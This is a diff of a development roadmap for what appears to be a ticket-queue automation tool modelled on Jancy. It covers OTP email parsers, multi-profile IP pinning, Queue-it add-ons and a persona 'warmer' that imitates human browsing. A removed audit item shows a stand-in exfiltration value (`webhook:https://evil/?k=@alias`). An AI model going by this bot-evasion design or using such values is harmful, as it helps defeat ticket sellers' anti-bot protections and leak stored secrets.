@@ -1512,7 +1512,32 @@ Gates: 667/667 API, 20/20 server, tsc and build clean, e2e GREEN.
 ## Jancy parity — Phases J1–J8 (audit 2026-11-19, wiki + docs.jancy.io + developer API, branch `jancy-wiki-audit`)
 
 Full audit + architecture: [parity-jancy-2026-11-19.md](parity-jancy-2026-11-19.md).
-The 2026-11-16 PASS is reopened. Owner round-1 answers recorded in §8 of the report; order now J1 → J2 → J6 (+ Discord) → J3 → J4 → J5 → J7 → J8. Round-2 follow-ups: docs/jancy-owner-questions-round2.md.
+The 2026-11-16 PASS is reopened. Owner round-1 answers recorded in §8 of the report. Round-2 follow-ups: docs/jancy-owner-questions-round2.md.
+
+**Agreed build order (owner, 2026-11-19).** Five milestones. Build everything that isn't blocked; the owner supplies keys and samples as items come up.
+
+- **M1, 2FA codes everywhere:**
+  1. **SEC-1**
+  2. J1-C2 `.jyl` loader
+  3. J1-C3 parsers + generic `otp()`
+  4. **AYCD complete** (key storage + verify + console; the owner submits the key for a real test)
+  5. J2 service connectors
+- **M2, identity and warmup:**
+  1. P-LOCK
+  2. W (owner warmer)
+- **M3, tabs and queue:**
+  1. **J3a tab-state core** (moved before J6: J6 and the Deck need it)
+  2. J6 TM / Queue-it add-ons + Discord
+  3. **DECK** (owner: GO after the test build passes)
+- **M4, daily workflow:**
+  1. J3b tab commands
+  2. J4 autofill map file
+  3. J5 cookie thinger
+- **M5, power user:**
+  1. J7 console
+  2. J8 extras
+
+Samples: the owner's Gmail (aggregated inbox) holds real **Ticketmaster US** auth/reset emails, used redacted as fixtures. It holds **no** AXS, SeatGeek, MLB, Etix, TM UK or TM MX code emails. Those sites go through `otp()` until real samples exist.
 
 Owner decisions 2026-11-19 (round 1 follow-up): **Q1** one container window with a tab per running profile → **ADR-0008 Profile Deck** (engines stay separate; J3 unblocked). **Q13** tab label = email + queue position, codes in the background. **Q19** a profile keeps one locked IP → **P-LOCK**. The owner's Multilogin warmer becomes QP's warmup engine → **W**. Work branch: `jancy-j1` (C: worktree `C:\Users\colli\qp-worktrees\jancy-j1`).
 
@@ -1532,10 +1557,35 @@ Owner decisions 2026-11-19 (round 1 follow-up): **Q1** one container window with
         - wrong key → `#BAD ACCT … Inbox app running?`;
         - inline key echoed as `aycd:***`.
       - **Not yet verified against the owner's real AYCD Inbox** (needs their API key with Inbox open).
-    - [ ] C2 — `.jyl` email/sms parser loader; C3 — AXS / SeatGeek / MLB / SMS parsers + generic `otp()` (with `aycdTask` too).
-- [ ] **SEC-1 — audit follow-ups (pre-existing, from the 2026-11-19 security audit):**
-  - (a) `POST /profiles/:id/resolve` is not gated like `/resolvers/run` and is unauthenticated when `SPECTRA_API_TOKEN` is unset, yet it returns live codes → require the token for resolve, or gate it;
-  - (b) any `@alias` in any spec argument is expanded, so a third-party CSV could aim a stored secret at `webhook:https://evil/?k=@alias` → warn on import, or allow-list alias slots per resolver.
+    - [x] **C1b — AYCD complete:**
+      - Key slot `GET/PUT/DELETE /integrations/aycd` + `POST /integrations/aycd/verify` (AYCD `/api/v1/user/verify`). The key is stored encrypted as alias `aycd`; routes never return it.
+      - Console card in Settings → Integrations: paste key / Save / Test / Remove, plus usage for both AYCD routes.
+      - **Live:** save + Test → `ok` against a fake Inbox API.
+      - **Owner submits the real key next, with Inbox open.**
+    - [x] **C2 — `.jyl` parser loader:**
+      - Jancy's published `<email-parser>` / `<sms-parser>` format, loaded from `<dataDir>/parsers/*.jyl` as `user-<name>`. Nodemailer-style `msg.from/to` address objects; `jancy.console.log` shim.
+      - `<command>` / `<macro>` / `<webinterface-endpoint>` are reported and skipped.
+      - Tested with Jancy's own two published examples, end to end over IMAP.
+      - **Live:** rescan loaded `user-google`, refused `<command>`, `user-google` parsed `928862`.
+    - [~] **C3 — parsers:**
+      - Ticketmaster US is **verified against the owner's real mail format** (redacted fixtures: auth, reset, personalised subject, iCloud Hide-My-Email sender, Outlook→Gmail forward; tracking-link digits ignored).
+      - Generic **`otp(from=…;subject=…;len=…;to=profile|any)`** for gmail/imap/aycd with safe-charset options.
+      - **Live:** `aycd:@aycd:otp(from=axs.com;subject=code)` on an AXS page built the right AYCD filters; `imap:…:ticketmaster` read a real-format iCloud-HME TM mail → `135790`.
+      - **Open:** the owner's Gmail has **no** AXS / SeatGeek / MLB / Etix / TM UK / TM MX code emails. Those sites use `otp()` until samples exist; dedicated parsers then.
+- [x] **SEC-1 — audit follow-ups:**
+  - (a) `POST /profiles/:id/resolve` now requires `SPECTRA_API_TOKEN` (403 otherwise; same rule as raw cookie export). Live: tokenless install → 403.
+  - (b) `ctx.usedAliases`: `webhook` refuses any stored secret; `imap` sends an `@alias` password only to known mail hosts (Gmail, Outlook, Yahoo, iCloud, AOL, Zoho), loopback (AYCD IMAP Server) or stored-account hosts. 6 tests.
+  - (c) second audit pass, all fixed:
+    - `static` never returns an alias (use `$literal` for site passwords);
+    - `env:` reads only `QP_VALUE_*`;
+    - an aliased IMAP password to a remote host needs TLS (993);
+    - `.jyl` header parsing is linear (no ReDoS).
+  - Commit `4c7b997` (with C1b/C2/C3). Gates: 738/738 API + 20/20 server.
+- [ ] **SEC-2 — owner decision: secret store vs scratch data dirs.**
+  - The DPAPI store lives under `QUEUEPILOT_DATA_DIR` (default `~\.queuepilot\secrets`), not `SPECTRA_DATA_DIR`. A scratch API with only `SPECTRA_DATA_DIR` therefore shares the live app's secrets.
+  - On 2026-11-19 this put a fake `aycd` test alias into the live store; it was removed the same day (alias list back to empty).
+  - Process fix in place: scratch runs set both env vars.
+  - Code option: make the store follow the configured data dir. That is safe only if the live app runs on the default data dir, so confirm before changing.
 - [ ] **P-LOCK — one profile, one IP**: rotation-link / provider proxies resolve once and are pinned to the profile; re-roll only on explicit operator action (logged); per-launch rotation kept for warmups/throwaways.
 - [ ] **W — Owner warmer as QP's warmup engine**: port the persona browsing engine + personas from `C:\multilogin\mlxwarmup\mlx-warmup` (Google-search arrival, banner accept, log-normal dwell, scroll bursts, same-site clicks, login/cart filter, batches over days) onto QP lifecycle/CDP; record/replay recipes stay as a second mode.
 - [ ] **DECK — Profile Deck (ADR-0008)**: (1) taskbar grouping quick win; (2) spike: adopt one fury window into a container + claim suite; (3) build the Deck with tab label `email · queue position`.
